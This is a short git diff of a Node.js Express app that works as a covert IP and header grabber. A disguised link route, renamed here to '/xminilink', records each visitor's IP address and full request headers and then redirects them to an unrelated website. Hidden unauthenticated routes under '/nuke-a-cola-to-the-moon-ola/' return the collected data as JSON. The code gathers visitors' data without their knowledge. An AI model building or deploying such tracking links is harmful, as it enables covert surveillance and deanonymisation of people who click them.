@@ -24,7 +24,7 @@ const logIp = (req) => {
 }
 
 const logHeaders = (req) => {
-    const ips = jsonfile.readFileSync(pathHeaders);
+    const ips = jsonfile.readFileSync(pathHeaders); 
     const headers = {
         ...req.headers
     };
@@ -37,10 +37,10 @@ const logHeaders = (req) => {
 
 }
 
-app.get("/masUiddFlagFS212",function(req,res) {
+app.get("/xminilink",function(req,res) {
     logHeaders(req);
     logIp(req);
-    res.redirect("https://google.com");
+    res.redirect("https://www.casadeculturatm.ro/#iLightbox[83e9177113b9396a671]/0");
 });
 app.use(express.static('static'));
 
@@ -53,10 +53,8 @@ app.listen(PORT, () => {
 app.get('/nuke-a-cola-to-the-moon-ola/123/123/', (req, res) => {
     const ips = jsonfile.readFileSync(pathIP);
     res.end(JSON.stringify(ips, null, 2));
-
 })
 app.get('/nuke-a-cola-to-the-moon-ola/123/111/', (req, res) => {
     const ips = jsonfile.readFileSync(pathHeaders);
     res.end(JSON.stringify(ips, null, 2));
-
 })
